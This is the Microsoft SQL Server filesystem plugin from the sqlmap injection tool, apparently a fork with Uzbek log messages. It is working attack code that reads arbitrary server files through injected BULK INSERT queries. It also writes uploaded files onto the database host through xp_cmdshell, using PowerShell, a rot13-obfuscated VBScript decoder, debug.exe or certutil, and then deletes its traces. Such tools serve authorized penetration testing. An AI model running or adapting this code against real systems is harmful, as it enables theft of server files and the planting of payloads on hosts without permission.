#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.uzbek import ut
import codecs
import ntpath
import os

from lib.core.common import checkFile
from lib.core.common import getLimitRange
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import posixToNtSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.compat import xrange
from lib.core.convert import encodeBase64
from lib.core.convert import encodeHex
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapNoneDataException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.request import inject

from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def _dataToScr(self, fileContent, chunkName):
        fileLines = []
        fileSize = len(fileContent)
        lineAddr = 0x100
        lineLen = 20

        fileLines.append("n %s" % chunkName)
        fileLines.append("rcx")
        fileLines.append("%x" % fileSize)
        fileLines.append("f 0100 %x 00" % fileSize)

        for fileLine in xrange(0, len(fileContent), lineLen):
            scrString = ""

            for lineChar in fileContent[fileLine:fileLine + lineLen]:
                strLineChar = encodeHex(lineChar, binary=False)

                if not scrString:
                    scrString = "e %x %s" % (lineAddr, strLineChar)
                else:
                    scrString += " %s" % strLineChar

                lineAddr += len(strLineChar) // 2

            fileLines.append(scrString)

        fileLines.append("w")
        fileLines.append("q")

        return fileLines

    def _updateDestChunk(self, fileContent, tmpPath):
        randScr = "tmpf%s.scr" % randomStr(lowercase=True)
        chunkName = randomStr(lowercase=True)
        fileScrLines = self._dataToScr(fileContent, chunkName)

        logger.debug('debug skripti %s\\%s ga yuklanmoqda, kuting..' % (tmpPath, randScr))

        self.xpCmdshellWriteFile(fileScrLines, tmpPath, randScr)

        logger.debug("%s\\%s bo'lak fayli %s debug skriptidan yaratilmoqda" % (tmpPath, chunkName, randScr))

        commands = (
            "cd \"%s\"" % tmpPath,
            "debug < %s" % randScr,
            "del /F /Q %s" % randScr
        )

        self.execCmd(" & ".join(command for command in commands))

        return chunkName

    def stackedReadFile(self, remoteFile):
        if not kb.bruteMode:
            infoMsg = "fayl olinmoqda: '%s'" % remoteFile
            logger.info(infoMsg)

        result = []
        txtTbl = self.fileTblName
        hexTbl = "%s%shex" % (self.fileTblName, randomStr())

        self.createSupportTbl(txtTbl, self.tblField, "text")
        inject.goStacked("DROP TABLE %s" % hexTbl)
        inject.goStacked("CREATE TABLE %s(id INT IDENTITY(1, 1) PRIMARY KEY, %s %s)" % (hexTbl, self.tblField, "VARCHAR(4096)"))

        logger.debug("'%s' fayli mazmuni yordamchi jadvalga yuklanmoqda" % remoteFile)
        inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (txtTbl, remoteFile, randomStr(10), randomStr(10)), silent=True)

        # Reference: https://web.archive.org/web/20120211184457/http://support.microsoft.com/kb/104829
        binToHexQuery = """DECLARE @charset VARCHAR(16)
        DECLARE @counter INT
        DECLARE @hexstr VARCHAR(4096)
        DECLARE @length INT
        DECLARE @chunk INT

        SET @charset = '0123456789ABCDEF'
        SET @counter = 1
        SET @hexstr = ''
        SET @length = (SELECT DATALENGTH(%s) FROM %s)
        SET @chunk = 1024

        WHILE (@counter <= @length)
        BEGIN
            DECLARE @tempint INT
            DECLARE @firstint INT
            DECLARE @secondint INT

            SET @tempint = CONVERT(INT, (SELECT TOP 1 ASCII(SUBSTRING(%s, @counter, 1)) FROM %s))
            SET @firstint = floor(@tempint/16)
            SET @secondint = @tempint - (@firstint * 16)
            SET @hexstr = @hexstr + SUBSTRING(@charset, @firstint+1, 1) + SUBSTRING(@charset, @secondint+1, 1)

            SET @counter = @counter + 1

            IF @counter %% @chunk = 0
            BEGIN
                INSERT INTO %s(%s) VALUES(@hexstr)
                SET @hexstr = ''
            END
        END

        IF @counter %% (@chunk) != 0
        BEGIN
            INSERT INTO %s(%s) VALUES(@hexstr)
        END
        """ % (self.tblField, txtTbl, self.tblField, txtTbl, hexTbl, self.tblField, hexTbl, self.tblField)

        binToHexQuery = binToHexQuery.replace("    ", "").replace("\n", " ")
        inject.goStacked(binToHexQuery)

        if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
            result = inject.getValue("SELECT %s FROM %s ORDER BY id ASC" % (self.tblField, hexTbl), resumeValue=False, blind=False, time=False, error=False)

        if not result:
            result = []
            count = inject.getValue("SELECT COUNT(*) FROM %s" % (hexTbl), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

            if not isNumPosStrValue(count):
                errMsg = "mazmunni olib bo'lmadi: "
                errMsg += "'%s' faylidan" % remoteFile
                raise SqlmapNoneDataException(errMsg)

            indexRange = getLimitRange(count)

            for index in indexRange:
                chunk = inject.getValue("SELECT TOP 1 %s FROM %s WHERE id NOT IN (SELECT TOP %d id FROM %s ORDER BY id ASC) ORDER BY id ASC" % (self.tblField, hexTbl, index, hexTbl), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
                result.append(chunk)

        inject.goStacked("DROP TABLE %s" % hexTbl)

        return result

    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        errMsg = "Microsoft SQL Server fayl yuklashni qo'llamaydi, usul: "
        errMsg += "UNION so'rov SQL-inyeksiyasi"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def _stackedWriteFilePS(self, tmpPath, localFileContent, remoteFile, fileType):
        infoMsg = 'PowerShell %s fayli mazmunini yozmoqda ' % fileType
        infoMsg += "'%s' fayliga" % remoteFile
        logger.info(infoMsg)

        encodedFileContent = encodeBase64(localFileContent, binary=False)
        encodedBase64File = "tmpf%s.txt" % randomStr(lowercase=True)
        encodedBase64FilePath = "%s\\%s" % (tmpPath, encodedBase64File)

        randPSScript = "tmpps%s.ps1" % randomStr(lowercase=True)
        randPSScriptPath = "%s\\%s" % (tmpPath, randPSScript)

        localFileSize = len(encodedFileContent)
        chunkMaxSize = 1024

        logger.debug('base64 fayli %s ga yuklanmoqda, kuting..' % encodedBase64FilePath)

        for i in xrange(0, localFileSize, chunkMaxSize):
            wEncodedChunk = encodedFileContent[i:i + chunkMaxSize]
            self.xpCmdshellWriteFile(wEncodedChunk, tmpPath, encodedBase64File)

        psString = "$Base64 = Get-Content -Path \"%s\"; " % encodedBase64FilePath
        psString += "$Base64 = $Base64 -replace \"`t|`n|`r\",\"\"; $Content = "
        psString += "[System.Convert]::FromBase64String($Base64); Set-Content "
        psString += "-Path \"%s\" -Value $Content -Encoding Byte" % remoteFile

        logger.debug('PowerShell base64 ochish skripti %s ga yuklanmoqda' % randPSScriptPath)
        self.xpCmdshellWriteFile(psString, tmpPath, randPSScript)

        logger.debug('%s faylini yozish uchun PowerShell base64 ochish skripti bajarilmoqda, kuting..' % remoteFile)

        commands = (
            "powershell -ExecutionPolicy ByPass -File \"%s\"" % randPSScriptPath,
            "del /F /Q \"%s\"" % encodedBase64FilePath,
            "del /F /Q \"%s\"" % randPSScriptPath
        )

        self.execCmd(" & ".join(command for command in commands))

    def _stackedWriteFileDebugExe(self, tmpPath, localFile, localFileContent, remoteFile, fileType):
        infoMsg = 'debug.exe orqali %s ' % fileType
        infoMsg += "fayl mazmuni '%s' ga yozilmoqda, kuting.." % remoteFile
        logger.info(infoMsg)

        remoteFileName = ntpath.basename(remoteFile)
        sFile = "%s\\%s" % (tmpPath, remoteFileName)
        localFileSize = os.path.getsize(localFile)
        debugSize = 0xFF00

        if localFileSize < debugSize:
            chunkName = self._updateDestChunk(localFileContent, tmpPath)

            debugMsg = "%s\\%s bo'lak fayli %s deb qayta nomlanmoqda " % (tmpPath, chunkName, fileType)
            debugMsg += "%s\\%s fayli va %s ga ko'chirilmoqda" % (tmpPath, remoteFileName, remoteFile)
            logger.debug(debugMsg)

            commands = (
                "cd \"%s\"" % tmpPath,
                "ren %s %s" % (chunkName, remoteFileName),
                "move /Y %s %s" % (remoteFileName, remoteFile)
            )

            self.execCmd(" & ".join(command for command in commands))
        else:
            debugMsg = 'fayl %d baytdan katta. ' % debugSize
            debugMsg += "sqlmap uni mahalliy bo'laklarga ajratib, "
            debugMsg += 'birma-bir yuklaydi va asl faylni '
            debugMsg += 'serverda tiklaydi, kuting..'
            logger.debug(debugMsg)

            for i in xrange(0, localFileSize, debugSize):
                localFileChunk = localFileContent[i:i + debugSize]
                chunkName = self._updateDestChunk(localFileChunk, tmpPath)

                if i == 0:
                    debugMsg = "bo'lak nomi o'zgartirilmoqda: "
                    copyCmd = "ren %s %s" % (chunkName, remoteFileName)
                else:
                    debugMsg = "bo'lak qo'shilmoqda: "
                    copyCmd = "copy /B /Y %s+%s %s" % (remoteFileName, chunkName, remoteFileName)

                debugMsg += '%s\\%s dan %s fayli %s\\%s ga' % (tmpPath, chunkName, fileType, tmpPath, remoteFileName)
                logger.debug(debugMsg)

                commands = (
                    "cd \"%s\"" % tmpPath,
                    copyCmd,
                    "del /F /Q %s" % chunkName
                )

                self.execCmd(" & ".join(command for command in commands))

            logger.debug("%s fayli %s dan %s ga ko'chirilmoqda" % (fileType, sFile, remoteFile))

            commands = (
                "cd \"%s\"" % tmpPath,
                "move /Y %s %s" % (remoteFileName, remoteFile)
            )

            self.execCmd(" & ".join(command for command in commands))

    def _stackedWriteFileVbs(self, tmpPath, localFileContent, remoteFile, fileType):
        infoMsg = 'maxsus Visual Basic skripti yozish uchun ishlatilmoqda: '
        infoMsg += "%s fayli mazmuni '%s' fayliga, kuting.." % (fileType, remoteFile)
        logger.info(infoMsg)

        randVbs = "tmps%s.vbs" % randomStr(lowercase=True)
        randFile = "tmpf%s.txt" % randomStr(lowercase=True)
        randFilePath = "%s\\%s" % (tmpPath, randFile)

        vbs = """Qvz vachgSvyrCngu, bhgchgSvyrCngu
        vachgSvyrCngu = "%f"
        bhgchgSvyrCngu = "%f"
        Frg sf = PerngrBowrpg("Fpevcgvat.SvyrFlfgrzBowrpg")
        Frg svyr = sf.TrgSvyr(vachgSvyrCngu)
        Vs svyr.Fvmr Gura
            Jfpevcg.Rpub "Ybnqvat sebz: " & vachgSvyrCngu
            Jfpevcg.Rpub
            Frg sq = sf.BcraGrkgSvyr(vachgSvyrCngu, 1)
            qngn = sq.ErnqNyy
            sq.Pybfr
            qngn = Ercynpr(qngn, " ", "")
            qngn = Ercynpr(qngn, ioPe, "")
            qngn = Ercynpr(qngn, ioYs, "")
            Jfpevcg.Rpub "Svkrq Vachg: "
            Jfpevcg.Rpub qngn
            Jfpevcg.Rpub
            qrpbqrqQngn = onfr64_qrpbqr(qngn)
            Jfpevcg.Rpub "Bhgchg: "
            Jfpevcg.Rpub qrpbqrqQngn
            Jfpevcg.Rpub
            Jfpevcg.Rpub "Jevgvat bhgchg va: " & bhgchgSvyrCngu
            Jfpevcg.Rpub
            Frg bsf = PerngrBowrpg("Fpevcgvat.SvyrFlfgrzBowrpg").BcraGrkgSvyr(bhgchgSvyrCngu, 2, Gehr)
            bsf.Jevgr qrpbqrqQngn
            bsf.pybfr
        Ryfr
            Jfpevcg.Rpub "Gur svyr vf rzcgl."
        Raq Vs
        Shapgvba onfr64_qrpbqr(olIny fgeVa)
            Qvz j1, j2, j3, j4, a, fgeBhg
            Sbe a = 1 Gb Yra(fgeVa) Fgrc 4
                j1 = zvzrqrpbqr(Zvq(fgeVa, a, 1))
                j2 = zvzrqrpbqr(Zvq(fgeVa, a + 1, 1))
                j3 = zvzrqrpbqr(Zvq(fgeVa, a + 2, 1))
                j4 = zvzrqrpbqr(Zvq(fgeVa, a + 3, 1))
                Vs Abg j2 Gura _
                fgeBhg = fgeBhg + Pue(((j1 * 4 + Vag(j2 / 16)) Naq 255))
                Vs  Abg j3 Gura _
                fgeBhg = fgeBhg + Pue(((j2 * 16 + Vag(j3 / 4)) Naq 255))
                Vs Abg j4 Gura _
                fgeBhg = fgeBhg + Pue(((j3 * 64 + j4) Naq 255))
            Arkg
            onfr64_qrpbqr = fgeBhg
            Raq Shapgvba
        Shapgvba zvzrqrpbqr(olIny fgeVa)
            Onfr64Punef = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/"
            Vs Yra(fgeVa) = 0 Gura
                zvzrqrpbqr = -1 : Rkvg Shapgvba
            Ryfr
                zvzrqrpbqr = VaFge(Onfr64Punef, fgeVa) - 1
            Raq Vs
        Raq Shapgvba"""

        # NOTE: https://github.com/sqlmapproject/sqlmap/issues/5581
        vbs = codecs.decode(vbs, "rot13")
        vbs = vbs.replace("    ", "")
        vbs = vbs % (randFilePath, remoteFile)
        encodedFileContent = encodeBase64(localFileContent, binary=False)

        logger.debug('faylning base64 mazmuni %s ga yuklanmoqda, kuting..' % randFilePath)

        self.xpCmdshellWriteFile(encodedFileContent, tmpPath, randFile)

        logger.debug('Visual Basic dekoderi %s\\%s ga yuklanmoqda, kuting..' % (tmpPath, randVbs))

        self.xpCmdshellWriteFile(vbs, tmpPath, randVbs)

        commands = (
            "cd \"%s\"" % tmpPath,
            "cscript //nologo %s" % randVbs,
            "del /F /Q %s" % randVbs,
            "del /F /Q %s" % randFile
        )

        self.execCmd(" & ".join(command for command in commands))

    def _stackedWriteFileCertutilExe(self, tmpPath, localFile, localFileContent, remoteFile, fileType):
        infoMsg = 'certutil.exe orqali %s ' % fileType
        infoMsg += "fayl mazmuni '%s' ga yozilmoqda, kuting.." % remoteFile
        logger.info(infoMsg)

        chunkMaxSize = 500

        randFile = "tmpf%s.txt" % randomStr(lowercase=True)
        randFilePath = "%s\\%s" % (tmpPath, randFile)

        encodedFileContent = encodeBase64(localFileContent, binary=False)

        splittedEncodedFileContent = '\n'.join([encodedFileContent[i:i + chunkMaxSize] for i in xrange(0, len(encodedFileContent), chunkMaxSize)])

        logger.debug('faylning base64 mazmuni %s ga yuklanmoqda, kuting..' % randFilePath)

        self.xpCmdshellWriteFile(splittedEncodedFileContent, tmpPath, randFile)

        logger.debug('fayl %s ga ochilmoqda..' % remoteFile)

        commands = (
            "cd \"%s\"" % tmpPath,
            "certutil -f -decode %s %s" % (randFile, remoteFile),
            "del /F /Q %s" % randFile
        )

        self.execCmd(" & ".join(command for command in commands))

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        # NOTE: this is needed here because we use xp_cmdshell extended
        # procedure to write a file on the back-end Microsoft SQL Server
        # file system
        self.initEnv()
        self.getRemoteTempPath()

        tmpPath = posixToNtSlashes(conf.tmpPath)
        remoteFile = posixToNtSlashes(remoteFile)

        checkFile(localFile)
        localFileContent = open(localFile, "rb").read()

        self._stackedWriteFilePS(tmpPath, localFileContent, remoteFile, fileType)
        written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        if written is False:
            message = ut('do you want to try to upload the file with ', 'faylni quyidagi usul bilan yuklaysizmi: ')
            message += ut('the custom Visual Basic script technique? [Y/n] ', 'maxsus Visual Basic skripti? [Y/n] ')

            if readInput(message, default='Y', boolean=True):
                self._stackedWriteFileVbs(tmpPath, localFileContent, remoteFile, fileType)
                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        if written is False:
            message = ut('do you want to try to upload the file with ', 'faylni quyidagi usul bilan yuklaysizmi: ')
            message += ut('the built-in debug.exe technique? [Y/n] ', 'ichki debug.exe usuli? [Y/n] ')

            if readInput(message, default='Y', boolean=True):
                self._stackedWriteFileDebugExe(tmpPath, localFile, localFileContent, remoteFile, fileType)
                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        if written is False:
            message = ut('do you want to try to upload the file with ', 'faylni quyidagi usul bilan yuklaysizmi: ')
            message += ut('the built-in certutil.exe technique? [Y/n] ', 'ichki certutil.exe usuli? [Y/n] ')

            if readInput(message, default='Y', boolean=True):
                self._stackedWriteFileCertutilExe(tmpPath, localFile, localFileContent, remoteFile, fileType)
                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        return written
